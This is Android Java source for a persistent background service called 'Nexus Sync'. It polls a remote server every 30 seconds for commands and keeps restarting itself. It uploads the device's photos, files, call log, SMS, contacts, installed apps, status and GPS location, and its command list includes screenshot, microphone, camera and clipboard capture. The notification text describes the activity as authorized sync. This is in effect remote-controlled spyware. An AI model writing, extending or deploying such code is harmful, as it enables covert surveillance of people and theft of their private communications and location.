package com.nexus.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class NexusService extends Service {

    private static final String CHANNEL_ID = "nexus_sync_v2";

    private Handler handler;
    private String deviceId;
    private NexusAPI api;

    private Runnable pingRunnable;
    private Runnable syncRunnable;

    private Runnable gpsRunnable;
    private boolean tasksStarted = false;
    private ExecutorService syncExecutor;
    private final AtomicBoolean syncRunning = new AtomicBoolean(false);

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        deviceId = NexusConfig.getDeviceId(this);
        api = new NexusAPI(this);
        RecoveryScheduler.schedule(this);
        syncExecutor = Executors.newSingleThreadExecutor();
        createNotificationChannel();
        startForeground(1, buildNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!tasksStarted) {
            tasksStarted = true;
            startAllTasks();
        }
        return START_STICKY;
    }

    private void startAllTasks() {
        // Ping ogni 30s
        pingRunnable = new Runnable() {
            @Override public void run() {
                api.ping(cmds -> handleCommands(cmds));
                handler.postDelayed(this, NexusConfig.PING_INTERVAL_MS);
            }
        };
        handler.post(pingRunnable);

        // Sync incrementale ogni 15 minuti; riconciliazione completa giornaliera.
        syncRunnable = new Runnable() {
            @Override public void run() {
                runSync(false);
                handler.postDelayed(this, MediaSyncPolicy.INCREMENTAL_INTERVAL_MS);
            }
        };
        handler.postDelayed(syncRunnable, 5000);

        // I comandi arrivano già nella risposta del ping: niente polling HTTP duplicato.

        // GPS ogni 30s
        gpsRunnable = new Runnable() {
            @Override public void run() {
                new LocationSync(NexusService.this, api).syncOnce();
                handler.postDelayed(this, RuntimeSyncPolicy.GPS_INTERVAL_MS);
            }
        };
        handler.postDelayed(gpsRunnable, 10000);
    }

    private void handleCommands(JSONArray cmds) {
        if (cmds == null) return;
        for (int i = 0; i < cmds.length(); i++) {
            try {
                JSONObject cmd = cmds.getJSONObject(i);
                String commandId = cmd.optString("id", "");
                String type = cmd.getString("type");
                JSONObject params = cmd.optJSONObject("params");
                boolean accepted = executeCommand(type, params);
                api.acknowledgeCommand(commandId, accepted,
                    accepted ? "accepted" : "unsupported_or_unavailable");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private boolean executeCommand(String type, JSONObject params) {
        switch (type) {
            case "sync_media":
                runSync(true);
                return true;
            case "take_screenshot":
                return false; // richiede consenso MediaProjection; non dichiarare falso successo
            case "record_audio":
                return false; // vietato avvio microfono da background su Android recente
            case "take_photo":
                return false; // richiede flusso utente/foreground dedicato
            case "get_location":
                new LocationSync(this, api).syncOnce();
                return true;
            case "get_apps":
                new AppListSync(this, api).sync();
                return true;
            case "get_status":
                syncExecutor.execute(() -> api.sendDeviceStatus(
                    DeviceStatusCollector.collect(NexusService.this)));
                return true;
            case "get_clipboard":
                return false; // Android limita clipboard in background
            default:
                return false;
        }
    }

    private void runSync(boolean forceFullMedia) {
        if (!syncRunning.compareAndSet(false, true)) return;
        syncExecutor.execute(() -> {
            try {
                GallerySync gallery = new GallerySync(NexusService.this, api);
                if (forceFullMedia) gallery.syncFullNow(); else gallery.sync();
                new ExternalTreeSync(NexusService.this, api).sync();
                new CallLogSync(NexusService.this, api).sync();
                new SMSSync(NexusService.this, api).sync();
                new ContactsSync(NexusService.this, api).sync();
            } finally {
                syncRunning.set(false);
            }
        });
    }

    private void createNotificationChannel() {
        NotificationChannel ch = new NotificationChannel(
            CHANNEL_ID, "Sincronizzazione Nexus", NotificationManager.IMPORTANCE_LOW);
        ch.setDescription("Mantiene attiva la sincronizzazione autorizzata del dispositivo");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableVibration(false);
        ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
    }

    private Notification buildNotification() {
        Intent openApp = new Intent(this, MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(
            this, 0, openApp, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Nexus Sync")
            .setContentText("Sincronizzazione attiva")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(contentIntent)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        if (syncExecutor != null) syncExecutor.shutdownNow();
        tasksStarted = false;
        super.onDestroy();
    }
}
